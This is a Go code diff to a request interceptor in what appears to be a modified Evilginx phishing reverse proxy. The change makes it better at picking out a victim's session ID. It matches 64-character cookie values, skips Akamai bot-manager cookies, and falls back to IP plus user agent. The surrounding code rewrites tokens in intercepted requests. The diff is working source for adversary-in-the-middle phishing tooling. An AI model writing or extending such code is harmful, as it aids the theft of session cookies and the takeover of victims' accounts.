@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
 	"regexp"
@@ -49,6 +50,14 @@ func (ri *RequestInterceptor) ClearInterceptors() {
 
 // InterceptRequest intercepts and modifies an HTTP request
 func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, bool) {
+	if sessionID == "" {
+		sessionID = ri.ExtractSessionID(req)
+	}
+
+	if sessionID != "" {
+		log.Debug("[INTERCEPTOR] Using session ID: %s", sessionID)
+	}
+
 	// Check if any trigger matches this request
 	for _, trigger := range ri.triggers {
 		if ri.matchesTrigger(req, trigger) {
@@ -327,19 +336,35 @@ func (ri *RequestInterceptor) replaceTokenInRequest(req *http.Request, oldToken,
 // ExtractSessionID extracts session ID from request/cookies
 func (ri *RequestInterceptor) ExtractSessionID(req *http.Request) string {
 	// Try to get session ID from cookie
-	cookie, err := req.Cookie("evilginx_session")
-	if err == nil {
-		return cookie.Value
+	for _, cookie := range req.Cookies() {
+		// Evilginx session IDs are usually hex strings of 64 characters
+		if len(cookie.Value) == 64 {
+			return cookie.Value
+		}
 	}
-	
+
+	// Fallback to any cookie that looks like a potential session ID (long string, not Akamai)
+	for _, cookie := range req.Cookies() {
+		if strings.HasPrefix(cookie.Name, "_abck") || strings.HasPrefix(cookie.Name, "bm_sz") {
+			continue
+		}
+		if len(cookie.Value) > 16 && !strings.Contains(cookie.Value, "-") {
+			return cookie.Value
+		}
+	}
+
 	// Try from URL parameter
 	sessionID := req.URL.Query().Get("session")
 	if sessionID != "" {
 		return sessionID
 	}
-	
+
 	// Generate from IP + User-Agent as fallback
-	ip := req.RemoteAddr
+	// IMPORTANT: Strip port from RemoteAddr
+	ip, _, err := net.SplitHostPort(req.RemoteAddr)
+	if err != nil {
+		ip = req.RemoteAddr
+	}
 	ua := req.UserAgent()
 	return fmt.Sprintf("%s_%s", ip, ua)
 }
